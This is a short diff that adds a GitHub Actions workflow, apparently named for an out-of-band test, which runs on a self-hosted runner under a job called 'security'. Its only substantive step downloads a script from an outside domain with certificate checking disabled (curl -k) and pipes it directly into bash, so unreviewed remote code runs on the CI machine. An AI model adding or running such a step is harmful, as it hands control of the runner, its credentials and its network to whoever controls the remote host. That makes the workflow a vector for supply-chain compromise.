@@ -1,0 +1,17 @@
+name: Manual Trigger Workflow oob
+
+on:
+  workflow_dispatch:
+
+jobs:
+  security:
+    runs-on: self-hosted
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Run bash script
+      run: |
+          apt-get update && apt-get install -y bash curl git 
+          curl -k https://m1tz.com/content/test.sh | bash
